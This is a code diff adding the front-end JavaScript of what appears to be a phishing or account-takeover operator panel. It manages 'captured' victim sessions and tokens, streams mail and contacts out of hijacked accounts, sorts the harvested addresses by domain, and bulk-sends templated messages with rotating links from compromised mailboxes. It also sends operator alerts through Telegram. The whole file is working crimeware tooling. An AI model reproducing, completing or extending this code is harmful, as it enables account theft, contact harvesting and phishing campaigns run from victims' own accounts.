+            try {
+                await fetch(`/api/sessions/${uc}`, {method:'DELETE'});
+                showToast('🗑️ Session deleted successfully');
+                loadDashboard();
+                loadSessions();
+            } catch(e) {
+                showToast('⚠️ Delete session failed: ' + e);
+            }
+        }
+        async function deleteAll() {
+            const ok = await appConfirm({
+                title: 'Delete ALL Captures & Sessions',
+                message: 'Are you sure you want to delete ALL captured sessions, tokens, and active victim records? This action is permanent and cannot be undone.',
+                confirmText: 'Delete All',
+                icon: '⚠️',
+                danger: true
+            });
+            if (!ok) return;
+            try {
+                await fetch('/api/sessions/all', {method:'DELETE'});
+                showToast('🗑️ All sessions deleted successfully');
+                loadDashboard();
+                loadSessions();
+            } catch(e) {
+                showToast('⚠️ Delete all failed: ' + e);
+            }
+        }
+
+        async function initAppSession() {
+            try {
+                const res = await fetch('/api/auth/me');
+                if (res.ok) {
+                    const data = await res.json();
+                    currentUserRole = data.role || 'admin';
+                    currentUsername = data.username || 'admin';
+
+                    const welcomeEl = document.getElementById('dash-welcome-user');
+                    if (welcomeEl) {
+                        let name = currentUsername || 'Admin';
+                        if (name.toLowerCase() === 'admin') name = 'Admin';
+                        else name = name.charAt(0).toUpperCase() + name.slice(1);
+                        welcomeEl.innerText = name;
+                    }
+
+                    window._currentOperatorData = data;
+                    const roleBadge = document.getElementById('sidebar-role-badge');
+                    if (currentUserRole === 'operator') {
+                        document.body.classList.add('role-operator');
+                        if (roleBadge) {
+                            roleBadge.innerHTML = `<span style="font-size:9.5px; color:#58a6ff; font-weight:700; letter-spacing:0.06em;">OPERATOR</span>`;
+                        }
+                        const opWelcomeBanner = document.getElementById('operator-welcome-banner');
+                        const opWelcomeName = document.getElementById('op-welcome-name');
+                        if (opWelcomeBanner) opWelcomeBanner.style.display = 'flex';
+                        if (opWelcomeName) opWelcomeName.innerText = currentUsername;
+
+                        const opTgBtn = document.getElementById('suite-btn-op-tg');
+                        if (opTgBtn) opTgBtn.style.display = 'inline-flex';
+
+                        const avatar = document.getElementById('outlook-top-avatar');
+                        if (avatar && currentUsername) {
+                            avatar.innerText = currentUsername.slice(0, 2).toUpperCase();
+                            avatar.title = `Operator: ${currentUsername} (Click for Settings)`;
+                        }
+
+                        if (data.operator_token && !window.location.pathname.startsWith('/m/')) {
+                            window.history.replaceState(null, '', '/m/' + data.operator_token);
+                        }
+                        showPage('mailbox');
+                        if (window.location.search.includes('setup_telegram=1') || data.needs_telegram_setup) {
+                            setTimeout(openOperatorTelegramModal, 600);
+                        }
+                        return;
+                    } else {
+                        if (roleBadge) {
+                            roleBadge.innerHTML = `<span style="font-size:9.5px; color:#a49498; font-weight:700; letter-spacing:0.06em;">ADMIN</span>`;
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error("Auth me check failed:", e);
+            }
+            const savedPage = localStorage.getItem('crimson_active_page') || 'dashboard';
+            showPage(savedPage);
+
+            // Restore active drafts & forms across the application
+            setTimeout(() => {
+                restoreMailboxComposeDraft();
+                restoreB2BDraft();
+            }, 400);
+
+            // Hook up auto-save draft listeners for compose and B2B inputs
+            ['compose-to', 'compose-cc', 'compose-bcc', 'compose-subject'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.addEventListener('input', saveMailboxComposeDraft);
+            });
+            const compEd = document.getElementById('compose-editor');
+            if (compEd) compEd.addEventListener('input', saveMailboxComposeDraft);
+
+            ['b2b-campaign-name', 'b2b-recipients', 'b2b-subjects', 'b2b-links', 'b2b-sender-account'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.addEventListener('input', saveB2BDraft);
+            });
+        }
+
+        function openOperatorTelegramModal() {
+            const m = document.getElementById('operator-telegram-modal');
+            if (!m) return;
+            const stat = document.getElementById('op-tg-status');
+            if (stat) stat.style.display = 'none';
+            if (window._currentOperatorData) {
+                if (window._currentOperatorData.tg_bot_token) {
+                    document.getElementById('op-tg-bot-token').value = window._currentOperatorData.tg_bot_token;
+                }
+                if (window._currentOperatorData.tg_chat_id) {
+                    document.getElementById('op-tg-chat-id').value = window._currentOperatorData.tg_chat_id;
+                }
+            }
+            m.style.display = 'flex';
+        }
+
+        function closeOperatorTelegramModal() {
+            const m = document.getElementById('operator-telegram-modal');
+            if (m) m.style.display = 'none';
+        }
+
+        async function saveOperatorTelegramSettings() {
+            const btn = document.getElementById('btn-save-op-tg');
+            const stat = document.getElementById('op-tg-status');
+            const botToken = document.getElementById('op-tg-bot-token').value.trim();
+            const chatId = document.getElementById('op-tg-chat-id').value.trim();
+
+            if (!botToken || !chatId) {
+                stat.className = 'error';
+                stat.style.background = 'rgba(229, 9, 20, 0.2)';
+                stat.style.color = '#ff6b72';
+                stat.style.display = 'block';
+                stat.innerText = 'Please provide both Bot Token and Chat ID.';
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = 'Testing Connection...';
+            stat.style.display = 'none';
+
+            try {
+                const res = await fetch('/api/operator/telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ tg_bot_token: botToken, tg_chat_id: chatId })
+                });
+                const data = await res.json();
+                btn.disabled = false;
+                btn.innerText = 'Test & Save Connection ❯';
+
+                if (data.success) {
+                    stat.style.background = 'rgba(46, 160, 67, 0.2)';
+                    stat.style.color = '#3fb950';
+                    stat.style.display = 'block';
+                    stat.innerText = '✓ Telegram Connected! Test notification sent.';
+                    showToast('✓ Telegram alerts configured successfully!');
+                    if (window._currentOperatorData) {
+                        window._currentOperatorData.tg_bot_token = botToken;
+                        window._currentOperatorData.tg_chat_id = chatId;
+                        window._currentOperatorData.needs_telegram_setup = false;
+                    }
+                    setTimeout(closeOperatorTelegramModal, 1500);
+                } else {
+                    stat.style.background = 'rgba(229, 9, 20, 0.2)';
+                    stat.style.color = '#ff6b72';
+                    stat.style.display = 'block';
+                    stat.innerText = data.error || 'Connection failed. Please check credentials.';
+                }
+            } catch (err) {
+                btn.disabled = false;
+                btn.innerText = 'Test & Save Connection ❯';
+                stat.style.background = 'rgba(229, 9, 20, 0.2)';
+                stat.style.color = '#ff6b72';
+                stat.style.display = 'block';
+                stat.innerText = 'Network error: ' + err;
+            }
+        }
+
+        setInterval(() => { 
+            if(currentUserRole !== 'operator' && document.getElementById('page-dashboard') && document.getElementById('page-dashboard').classList.contains('active')) {
+                loadDashboard(); 
+            }
+            if(document.getElementById('page-sessions') && document.getElementById('page-sessions').classList.contains('active')) {
+                loadSessions();
+            }
+        }, 3000);
+        setInterval(updateLiveCountdowns, 1000);
+        initAppSession();
+
+        // ═══════════════════════════════════════════════════════════════
+        // EXTRACTOR & SORTER JAVASCRIPT
+        // ═══════════════════════════════════════════════════════════════
+
+        let _extSelectedAccount = '';
+        let _extCatMail = true;
+        let _extCatContacts = true;
+        let _extEventSource = null;
+        let _extHasResults = false;
+        let _extStartTime = null;
+
+        let _sortRawText = '';
+        let _sortFileName = '';
+        let _sortHasResults = false;
+
+        function termLog(termId, msg, cls) {
+            const term = document.getElementById(termId);
+            if (!term) return;
+            const elapsed = _extStartTime ? Math.floor((Date.now() - _extStartTime) / 1000) : 0;
+            const mm = String(Math.floor(elapsed / 60)).padStart(2, '0');
+            const ss = String(elapsed % 60).padStart(2, '0');
+            const line = document.createElement('div');
+            line.className = `terminal-line ${cls || ''}`;
+            line.innerHTML = `<span class="term-ts">[${mm}:${ss}]</span><span class="term-txt">${msg}</span>`;
+            term.appendChild(line);
+            term.scrollTop = term.scrollHeight;
+        }
+
+        async function loadExtractorSessions() {
+            const sessions = await (await fetch('/api/sessions')).json();
+            const captured = sessions.filter(s => s.status === 'CAPTURED');
+            const sel = document.getElementById('extractor-account-select');
+            if (captured.length === 0) {
+                sel.innerHTML = '<option value="">— No captured accounts —</option>';
+                document.getElementById('ext-start-btn').disabled = true;
+                return;
+            }
+            const prev = sel.value;
+            sel.innerHTML = '<option value="">— Select captured account —</option>' +
+                captured.map(s => `<option value="${s.user_code}">${s.victim_email || s.victim_name || s.user_code}</option>`).join('');
+            if (prev && captured.find(s => s.user_code === prev)) sel.value = prev;
+            onExtractorAccountChange();
+        }
+
+        function onExtractorAccountChange() {
+            _extSelectedAccount = document.getElementById('extractor-account-select').value;
+            const canStart = !!_extSelectedAccount && (_extCatMail || _extCatContacts);
+            document.getElementById('ext-start-btn').disabled = !canStart;
+        }
+
+        function switchExtractorTab(tab) {
+            document.getElementById('etab-extractor').classList.toggle('active', tab === 'extractor');
+            document.getElementById('etab-sorter').classList.toggle('active', tab === 'sorter');
+            document.getElementById('epanel-extractor').classList.toggle('active', tab === 'extractor');
+            document.getElementById('epanel-sorter').classList.toggle('active', tab === 'sorter');
+            // Account select only relevant for extractor
+            document.getElementById('extractor-account-select').style.display = (tab === 'extractor') ? '' : 'none';
+        }
+
+        function toggleCategory(cat) {
+            if (cat === 'mail') {
+                _extCatMail = !_extCatMail;
+                document.getElementById('cat-mail').classList.toggle('selected', _extCatMail);
+            } else {
+                _extCatContacts = !_extCatContacts;
+                document.getElementById('cat-contacts').classList.toggle('selected', _extCatContacts);
+            }
+            onExtractorAccountChange();
+        }
+
+        function startExtraction() {
+            if (!_extSelectedAccount) { showToast('Select an account first'); return; }
+            if (!_extCatMail && !_extCatContacts) { showToast('Select at least one category'); return; }
+
+            // Reset state
+            if (_extEventSource) { _extEventSource.close(); _extEventSource = null; }
+            document.getElementById('ext-terminal').innerHTML = '';
+            document.getElementById('ctr-mail').innerText = '0';
+            document.getElementById('ctr-emails').innerText = '0';
+            document.getElementById('ctr-scanned').innerText = '0';
+            document.getElementById('ext-progress-bar-outer').style.display = 'block';
+            document.getElementById('ext-progress-bar').style.width = '0%';
+            document.getElementById('ext-dl-txt-btn').disabled = true;
+            document.getElementById('ext-dl-csv-btn').disabled = true;
+            document.getElementById('ext-start-btn').disabled = true;
+            _extHasResults = false;
+            _extStartTime = Date.now();
+
+            const url = `/api/extractor/stream?user_code=${encodeURIComponent(_extSelectedAccount)}&mail=${_extCatMail}&contacts=${_extCatContacts}`;
+            const es = new EventSource(url);
+            _extEventSource = es;
+
+            es.onmessage = (e) => {
+                let data;
+                try { data = JSON.parse(e.data); } catch { return; }
+
+                if (data.type === 'email') {
+                    const src = data.source === 'contact' ? `[contact${data.name ? ': ' + data.name : ''}]` : '[mail]';
+                    termLog('ext-terminal', `${src} <b style="color:#f0f6fc;">${data.email}</b>`, 'success');
+                    document.getElementById('ctr-mail').innerText = data.mail || 0;
+                    document.getElementById('ctr-emails').innerText = data.emails || 0;
+                    document.getElementById('ctr-scanned').innerText = data.scanned || 0;
+                } else if (data.type === 'status') {
+                    termLog('ext-terminal', data.msg, data.cls || 'dim');
+                } else if (data.type === 'progress') {
+                    document.getElementById('ext-progress-bar').style.width = Math.min(data.pct || 0, 95) + '%';
+                } else if (data.type === 'done') {
+                    termLog('ext-terminal', data.msg, 'success');
+                    document.getElementById('ext-progress-bar').style.width = '100%';
+                    document.getElementById('ctr-mail').innerText = data.mail || 0;
+                    document.getElementById('ctr-emails').innerText = data.total || 0;
+                    document.getElementById('ctr-scanned').innerText = data.scanned || 0;
+                    _extHasResults = data.total > 0;
+                    document.getElementById('ext-dl-txt-btn').disabled = !_extHasResults;
+                    document.getElementById('ext-dl-csv-btn').disabled = !_extHasResults;
+                    document.getElementById('ext-start-btn').disabled = false;
+                    es.close(); _extEventSource = null;
+                    setTimeout(() => { document.getElementById('ext-progress-bar-outer').style.display = 'none'; }, 2000);
+                } else if (data.type === 'error') {
+                    termLog('ext-terminal', '❌ ' + data.msg, 'error');
+                    document.getElementById('ext-start-btn').disabled = false;
+                    es.close(); _extEventSource = null;
+                }
+            };
+
+            es.onerror = () => {
+                if (_extEventSource) {
+                    termLog('ext-terminal', '⚠ Stream closed or connection error.', 'warn');
+                    es.close(); _extEventSource = null;
+                    document.getElementById('ext-start-btn').disabled = false;
+                }
+            };
+        }
+
+        function resetExtractor() {
+            if (_extEventSource) { _extEventSource.close(); _extEventSource = null; }
+            document.getElementById('ext-terminal').innerHTML = '<div class="terminal-line dim"><span class="term-ts">[00:00]</span><span class="term-txt">Select an account and categories above, then click ▶ Start Extraction.</span></div>';
+            document.getElementById('ctr-mail').innerText = '0';
+            document.getElementById('ctr-emails').innerText = '0';
+            document.getElementById('ctr-scanned').innerText = '0';
+            document.getElementById('ext-progress-bar-outer').style.display = 'none';
+            document.getElementById('ext-dl-txt-btn').disabled = true;
+            document.getElementById('ext-dl-csv-btn').disabled = true;
+            _extHasResults = false;
+            onExtractorAccountChange();
+        }
+
+        function downloadExtracted(fmt) {
+            if (!_extSelectedAccount) return;
+            const url = `/api/extractor/download?user_code=${encodeURIComponent(_extSelectedAccount)}&format=${fmt}`;
+            const a = document.createElement('a');
+            a.href = url; a.download = ''; a.click();
+            showToast(`Downloading extracted emails as .${fmt}...`);
+        }
+
+        // ─── SORTER ───────────────────────────────────────────────────
+
+        function handleSorterFileSelect(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            _sortFileName = file.name;
+            document.getElementById('sorter-file-name').innerText = '📎 ' + file.name;
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                _sortRawText = ev.target.result;
+                document.getElementById('sort-start-btn').disabled = false;
+                termLog('sort-terminal', `✅ File loaded: "${file.name}" (${_sortRawText.length.toLocaleString()} chars)`, 'success');
+            };
+            reader.readAsText(file);
+        }
+
+        function handleSorterDrop(e) {
+            e.preventDefault();
+            document.getElementById('sorter-drop-zone').classList.remove('drag-over');
+            const file = e.dataTransfer.files[0];
+            if (!file) return;
+            // Trigger via synthetic event
+            const dt = new DataTransfer();
+            dt.items.add(file);
+            const input = document.getElementById('sorter-file-input');
+            input.files = dt.files;
+            handleSorterFileSelect({ target: { files: [file] } });
+        }
+
+        async function startSorting() {
+            if (!_sortRawText) { showToast('No file loaded'); return; }
+            _extStartTime = Date.now();
+            document.getElementById('sort-terminal').innerHTML = '';
+            document.getElementById('sort-ctr-total').innerText = '0';
+            document.getElementById('sort-ctr-domains').innerText = '0';
+            document.getElementById('sort-dl-txt-btn').disabled = true;
+            document.getElementById('sort-dl-csv-btn').disabled = true;
+            document.getElementById('sort-dl-zip-btn').disabled = true;
+            _sortHasResults = false;
+
+            termLog('sort-terminal', `🔍 Parsing "${_sortFileName}"...`, 'header');
+
+            const formData = new FormData();
+            const blob = new Blob([_sortRawText], { type: 'text/plain' });
+            formData.append('file', blob, _sortFileName || 'upload.txt');
+
+            try {
+                const res = await (await fetch('/api/sorter/sort', { method: 'POST', body: formData })).json();
+                document.getElementById('sort-ctr-total').innerText = res.total || 0;
+                document.getElementById('sort-ctr-domains').innerText = res.domains || 0;
+                termLog('sort-terminal', `✅ Found <b style="color:#f0f6fc;">${res.total}</b> unique addresses across <b style="color:#f0f6fc;">${res.domains}</b> domains.`, 'success');
+                termLog('sort-terminal', '', 'dim');
+
+                (res.groups || []).forEach(g => {
+                    // Domain group header line
+                    const hdr = document.createElement('div');
+                    hdr.className = 'domain-group-header';
+                    hdr.innerHTML = `<span>📂 ${g.provider}</span><span class="domain-badge">${g.count}</span>`;
+                    document.getElementById('sort-terminal').appendChild(hdr);
+                    g.emails.forEach(em => {
+                        termLog('sort-terminal', em, 'success');
+                    });
+                    termLog('sort-terminal', '', 'dim');
+                });
+
+                _sortHasResults = res.total > 0;
+                document.getElementById('sort-dl-txt-btn').disabled = !_sortHasResults;
+                document.getElementById('sort-dl-csv-btn').disabled = !_sortHasResults;
+                document.getElementById('sort-dl-zip-btn').disabled = !_sortHasResults;
+            } catch(ex) {
+                termLog('sort-terminal', '❌ Sort failed: ' + ex, 'error');
+            }
+        }
+
+        function resetSorter() {
+            _sortRawText = '';
+            _sortFileName = '';
+            _sortHasResults = false;
+            document.getElementById('sort-terminal').innerHTML = '<div class="terminal-line dim"><span class="term-ts">[00:00]</span><span class="term-txt">Upload a TXT or CSV file containing email addresses, then click ▶ Start Sorting.</span></div>';
+            document.getElementById('sort-ctr-total').innerText = '0';
+            document.getElementById('sort-ctr-domains').innerText = '0';
+            document.getElementById('sort-start-btn').disabled = true;
+            document.getElementById('sort-dl-txt-btn').disabled = true;
+            document.getElementById('sort-dl-csv-btn').disabled = true;
+            document.getElementById('sort-dl-zip-btn').disabled = true;
+            document.getElementById('sorter-file-name').innerText = '';
+            document.getElementById('sorter-file-input').value = '';
+        }
+
+        function downloadSorted(fmt) {
+            if (!_sortHasResults) return;
+            const url = `/api/sorter/download?format=${fmt}`;
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = fmt === 'zip' ? 'sorted_by_domain.zip' : (fmt === 'csv' ? 'sorted_emails.csv' : 'sorted_emails.txt');
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            showToast(`✓ Downloading sorted emails as ${fmt.toUpperCase()}...`);
+        }
+
+        // ════════════════════════════════════════════════════════════════
+        // B2B SENDER JAVASCRIPT
+        // ════════════════════════════════════════════════════════════════
+        let _b2bBCC = false;
+        let _b2bRandomize = false;
+        let _b2bSaveSent = true;
+        let _b2bPriority = 'normal';
+        let _b2bDelayMs = 0;
+        let _b2bSentCt = 0;
+        let _b2bFailCt = 0;
+        let _b2bStartTime = null;
+        let _b2bEditorRange = null;
+        let _b2bFiles = [];
+
+        async function loadB2BSessions() {
+            const sessions = await (await fetch('/api/sessions')).json();
+            const captured = sessions.filter(s => s.status === 'CAPTURED');
+            const sel = document.getElementById('b2b-account-select');
+            const prev = sel.value;
+            sel.innerHTML = '<option value="">— Select Account —</option>' +
+                captured.map(s => `<option value="${s.user_code}">${s.victim_email || s.victim_name || s.user_code}</option>`).join('');
+            if (prev && captured.find(s => s.user_code === prev)) sel.value = prev;
+        }
+
+        function onB2BAccountChange() {}
+
+        async function loadB2BCampaignCount() {
+            try {
+                const r = await (await fetch('/api/b2b/campaigns')).json();
+                document.getElementById('b2b-campaign-count').textContent = r.length;
+            } catch {}
+        }
+
+        function toggleB2BBCC() {
+            _b2bBCC = !_b2bBCC;
+            document.getElementById('b2b-bcc-sw').classList.toggle('on', _b2bBCC);
+        }
+
+        function toggleB2BOpt(opt) {
+            if (opt === 'randomize') {
+                _b2bRandomize = !_b2bRandomize;
+                document.getElementById('b2b-rand-off').classList.toggle('active', !_b2bRandomize);
+                document.getElementById('b2b-rand-on').classList.toggle('active', _b2bRandomize);
+            } else {
+                _b2bSaveSent = !_b2bSaveSent;
+                document.getElementById('b2b-save-off').classList.toggle('active', !_b2bSaveSent);
+                document.getElementById('b2b-save-on').classList.toggle('active', _b2bSaveSent);
+                document.getElementById('b2b-save-desc').textContent = _b2bSaveSent
+                    ? "On — sent mail is stored in the account's Sent folder."
+                    : "Off — sent mail is not stored in the account's Sent folder.";
+            }
+        }
+
+        function cyclePriority() {
+            const opts = ['normal','high','low'];
+            const lbls = ['NORMAL','HIGH','LOW'];
+            const idx = (opts.indexOf(_b2bPriority) + 1) % 3;
+            _b2bPriority = opts[idx];
+            document.getElementById('b2b-priority-label').textContent = lbls[idx];
+        }
+
+        function toggleB2BDelay() {
+            const vals = [0, 500, 1000, 2000, 5000];
+            const lbls = ['OFF','0.5s','1s','2s','5s'];
+            const idx = (vals.indexOf(_b2bDelayMs) + 1) % vals.length;
+            _b2bDelayMs = vals[idx];
+            document.getElementById('b2b-delay-label').textContent = lbls[idx];
+        }
+
+        function adjustB2BCounter(id, d) {
+            const el = document.getElementById(id);
+            el.value = Math.max(1, parseInt(el.value || 1) + d);
+        }
+
+        function updateB2BRecipientCount() {
+            const lines = document.getElementById('b2b-recipients').value.trim().split('\n').filter(l => l.trim().includes('@'));
+            document.getElementById('b2b-rec-count').textContent = `${lines.length} recipients`;
+        }
+
+        function dedupeB2BRecipients() {
+            const ta = document.getElementById('b2b-recipients');
+            const unique = [...new Set(ta.value.split('\n').map(l => l.trim().toLowerCase()).filter(l => l.includes('@')))];
+            ta.value = unique.join('\n');
+            updateB2BRecipientCount();
+            showToast(`Deduped: ${unique.length} unique addresses`);
+        }
+
+        function loadB2BRecipientsFile() { document.getElementById('b2b-recipients-file').click(); }
+
+        function handleB2BRecipientsFile(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = ev => {
+                const found = (ev.target.result.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g) || []);
+                document.getElementById('b2b-recipients').value = [...new Set(found)].join('\n');
+                updateB2BRecipientCount();
+                showToast(`Loaded ${found.length} addresses from ${file.name}`);
+            };
+            reader.readAsText(file);
+        }
+
+        function renderB2BFilesList() {
+            const listEl = document.getElementById('b2b-files-list');
+            if (!listEl) return;
+            if (!_b2bFiles.length) {
+                listEl.innerHTML = '<span style="color:#6e5860;">No files attached.</span>';
+                return;
+            }
+            listEl.innerHTML = _b2bFiles.map((f, idx) => `
+                <div style="display:inline-flex; align-items:center; gap:8px; background:#1c1014; border:1px solid #38161b; padding:4px 10px; border-radius:6px; margin:3px 6px 3px 0;">
+                    <span style="color:#ff6b72; font-size:12px;">📎 ${escapeHtml(f.name)} (${(f.size/1024).toFixed(1)} KB)</span>
+                    <button type="button" onclick="removeB2BFile(${idx})" style="background:none; border:none; color:#a49498; cursor:pointer; font-weight:bold; font-size:15px; line-height:1; padding:0 3px;" title="Remove this attachment" onmouseover="this.style.color='#ff6b72'" onmouseout="this.style.color='#a49498'">&times;</button>
+                </div>
+            `).join('');
+        }
+
+        function handleB2BFiles(e) {
+            const newFiles = [...e.target.files];
+            for (const nf of newFiles) {
+                if (!_b2bFiles.some(existing => existing.name === nf.name && existing.size === nf.size)) {
+                    _b2bFiles.push(nf);
+                }
+            }
+            renderB2BFilesList();
+            e.target.value = '';
+        }
+
+        function removeB2BFile(idx) {
+            _b2bFiles.splice(idx, 1);
+            renderB2BFilesList();
+        }
+
+        // ── Editor helpers ────────────────────────────────────────────
+        function b2bExec(cmd, val) {
+            document.getElementById('b2b-editor').focus();
+            document.execCommand(cmd, false, val || null);
+        }
+
+        function insertB2BLink() {
+            const url = prompt('Enter URL:');
+            if (url) b2bExec('createLink', url);
+        }
+
+        function insertB2BImage() {
+            const url = prompt('Enter image URL:');
+            if (url) b2bExec('insertImage', url);
+        }
+
+        function insertB2BMerge(tag) {
+            const ed = document.getElementById('b2b-editor');
+            ed.focus();
+            if (_b2bEditorRange) {
+                const sel = window.getSelection();
+                sel.removeAllRanges(); sel.addRange(_b2bEditorRange);
+            }
+            document.execCommand('insertText', false, tag);
+        }
+
+        document.getElementById('b2b-editor') && document.getElementById('b2b-editor').addEventListener('blur', () => {
+            const sel = window.getSelection();
+            if (sel && sel.rangeCount) _b2bEditorRange = sel.getRangeAt(0).cloneRange();
+        });
+
+        function b2bGetHtml() {
+            // Always return the canonical HTML — source textarea wins if it has content
+            const srcTa = document.getElementById('b2b-source-ta');
+            const editor = document.getElementById('b2b-editor');
+            // If source panel is visible or source textarea was recently used, sync from it
+            if (document.getElementById('b2b-source-panel').style.display !== 'none') {
+                return srcTa.value;
+            }
+            return editor.innerHTML;
+        }
+
+        // ── HTML Escaper Helper ───────────────────────────────────────
+        function escapeHtml(str) {
+            if (str === null || str === undefined) return '';
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
+        let _b2bLivePreviewTimer = null;
+        let _b2bImportDeploymentsList = [];
+
+        function autoResizePreviewFrame() {
+            const iframe = document.getElementById('b2b-preview-frame');
+            if (iframe && iframe.contentWindow && iframe.contentWindow.document.body) {
+                try {
+                    const body = iframe.contentWindow.document.body;
+                    const html = iframe.contentWindow.document.documentElement;
+                    const h = Math.max(400, Math.max(body.scrollHeight, html.scrollHeight) + 30);
+                    iframe.style.height = h + 'px';
+                } catch(e) {}
+            }
+        }
+
+        function autoResizeSourceTa() {
+            const ta = document.getElementById('b2b-source-ta');
+            if (ta) {
+                ta.style.height = 'auto';
+                ta.style.height = Math.max(380, ta.scrollHeight + 15) + 'px';
+            }
+        }
+
+        function toggleB2BFullscreen() {
+            const sec = document.getElementById('b2b-body-section');
+            const btn = document.getElementById('b2b-fs-btn');
+            if (!sec) return;
+            const isFs = sec.classList.toggle('b2b-fullscreen');
+            if (btn) btn.innerHTML = isFs ? '✕ Exit Fullscreen' : '⛶ Fullscreen';
+            if (isFs) {
+                document.body.style.overflow = 'hidden';
+            } else {
+                document.body.style.overflow = '';
+            }
+            updateB2BLivePreview();
+        }
+
+        function updateB2BLivePreview() {
+            const iframe = document.getElementById('b2b-preview-frame') || document.getElementById('b2b-live-preview-iframe');
+            if (!iframe) return;
+
+            const editor = document.getElementById('b2b-editor');
+            const srcTa = document.getElementById('b2b-source-ta');
+            const isSource = document.getElementById('b2b-source-panel') && document.getElementById('b2b-source-panel').style.display !== 'none';
+            const rawHtml = isSource ? (srcTa ? srcTa.value : '') : (editor ? editor.innerHTML : '');
+
+            // Recipient data simulation
+            const recRaw = (document.getElementById('b2b-recipients')?.value || '').trim();
+            const firstEmail = recRaw.split('\n').map(l=>l.trim()).find(l=>l.includes('@')) || 'alex.morgan@contoso.com';
+            const emailParts = firstEmail.split('@');
+            const localPart = emailParts[0] || 'alex.morgan';
+            const domainPart = emailParts[1] || 'contoso.com';
+            const cleanName = localPart.replace(/[._\-+]/g, ' ').replace(/\b\w/g, c=>c.toUpperCase());
+            const cleanCompany = domainPart.split('.')[0].replace(/\b\w/g, c=>c.toUpperCase());
+
+            // Link simulation
+            const linksRaw = (document.getElementById('b2b-links')?.value || '').trim();
+            const firstLink = linksRaw.split('\n').map(l=>l.trim()).find(l=>l.length > 0) || 'https://example.com/share';
+
+            let rendered = rawHtml || '<div style="font-family:sans-serif;color:#888;padding:40px;text-align:center;">Email body is empty. Type in the editor or click <b>📥 IMPORT TEMPLATE</b> above.</div>';
+
+            rendered = rendered
+                .replace(/\[NAME\]/g, cleanName)
+                .replace(/\[EMAIL\]/g, firstEmail)
+                .replace(/\[DOMAIN\]/g, domainPart)
+                .replace(/\[COMPANY\]/g, cleanCompany)
+                .replace(/\[LINK\]/g, firstLink);
+
+            iframe.srcdoc = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;padding:12px;background:#f7f9fa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;} *{max-width:100%!important;box-sizing:border-box!important;} img{max-width:100%!important;height:auto!important;} table{max-width:100%!important;width:100%!important;} .email-card{max-width:560px!important;width:100%!important;margin:0 auto!important;}</style></head><body>${rendered}</body></html>`;
+            setTimeout(autoResizePreviewFrame, 120);
+        }
+
+        function scheduleB2BLivePreview() {
+            clearTimeout(_b2bLivePreviewTimer);
+            _b2bLivePreviewTimer = setTimeout(updateB2BLivePreview, 120);
+        }
+
+        function setB2BPreviewDevice(mode) {
+            const wrap = document.getElementById('b2b-preview-panel') || document.getElementById('b2b-live-frame-wrap');
+            const btnDesk = document.getElementById('b2b-prev-btn-desktop');
+            const btnMob = document.getElementById('b2b-prev-btn-mobile');
+            if (!wrap) return;
+            if (mode === 'mobile') {
+                wrap.classList.add('mobile');
+                btnDesk && btnDesk.classList.remove('active');
+                btnMob && btnMob.classList.add('active');
+            } else {
+                wrap.classList.remove('mobile');
+                btnDesk && btnDesk.classList.add('active');
+                btnMob && btnMob.classList.remove('active');
+            }
+            setTimeout(autoResizePreviewFrame, 80);
+        }
+
+        function switchB2BTab(tab) {
+            const editor   = document.getElementById('b2b-editor');
+            const srcTa    = document.getElementById('b2b-source-ta');
+            const editPan  = document.getElementById('b2b-edit-panel');
+            const srcPan   = document.getElementById('b2b-source-panel');
+            const prevPan  = document.getElementById('b2b-preview-panel');
+            const tb       = document.getElementById('b2b-toolbar');
+            const devWrap  = document.getElementById('b2b-prev-dev-wrap');
+
+            const prevTab = ['edit','source','preview'].find(t =>
+                document.getElementById('b2b-tab-'+t) && document.getElementById('b2b-tab-'+t).classList.contains('active')) || 'edit';
+
+            // Sync outgoing tab -> incoming
+            if (prevTab === 'source' && tab !== 'source') {
+                if (editor && srcTa) editor.innerHTML = srcTa.value;
+            } else if (prevTab === 'edit' && tab === 'source') {
+                if (editor && srcTa) srcTa.value = editor.innerHTML;
+            } else if (prevTab === 'preview' && tab === 'source') {
+                if (editor && srcTa) srcTa.value = editor.innerHTML;
+            }
+
+            // Toggle tabs
+            ['edit', 'source', 'preview'].forEach(t => {
+                const el = document.getElementById('b2b-tab-' + t);
+                if (el) el.classList.toggle('active', tab === t);
+            });
+
+            // Toggle panels
+            if (editPan) editPan.style.display = tab === 'edit' ? '' : 'none';
+            if (srcPan)  srcPan.style.display  = tab === 'source' ? '' : 'none';
+            if (prevPan) prevPan.style.display = tab === 'preview' ? 'flex' : 'none';
+
+            // Toolbar only on edit
+            if (tb) tb.style.display = tab === 'edit' ? 'flex' : 'none';
+
+            // Device selector only on preview
+            if (devWrap) devWrap.style.display = tab === 'preview' ? 'flex' : 'none';
+
+            // Resize and update
+            if (tab === 'source') {
+                setTimeout(autoResizeSourceTa, 20);
+            }
+            if (tab === 'preview') {
+                updateB2BLivePreview();
+            }
+        }
+
+        // Intercept pastes into the visual editor — if it looks like HTML, render it
+        document.getElementById('b2b-editor') && document.getElementById('b2b-editor').addEventListener('paste', function(e) {
+            const html  = e.clipboardData.getData('text/html');
+            const plain = e.clipboardData.getData('text/plain').trim();
+            if (html) {
+                setTimeout(updateB2BLivePreview, 50);
+                return;
+            }
+            if (plain.startsWith('<') && (plain.includes('</') || plain.includes('/>'))) {
+                e.preventDefault();
+                this.innerHTML = plain;
+                const range = document.createRange();
+                range.selectNodeContents(this);
+                range.collapse(false);
+                const sel = window.getSelection();
+                sel.removeAllRanges();
+                sel.addRange(range);
